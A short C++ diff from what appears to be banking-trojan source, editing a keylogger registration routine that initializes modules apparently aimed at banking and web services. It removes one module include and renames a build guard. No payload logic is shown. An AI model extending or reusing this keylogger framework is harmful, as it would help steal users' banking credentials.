@@ -14,7 +14,7 @@
 #include "FakturaWeb.cpp"
 #include "AvangardWeb.cpp"
 #include "RafaDll.cpp"
-#include "Yandex.cpp"
+
 
 //#include "cc.cpp"
 
@@ -318,7 +318,7 @@ void RegisterAllKeyLoggerSystem(PKeyLoggerFilterData Data, DWORD hashApp)
 		AvangardWeb::Init();
 	#endif
 
-	#ifdef YandexModule
+	#ifdef YandexH
 		YandexSearchJpg::Init();
 	#endif
 
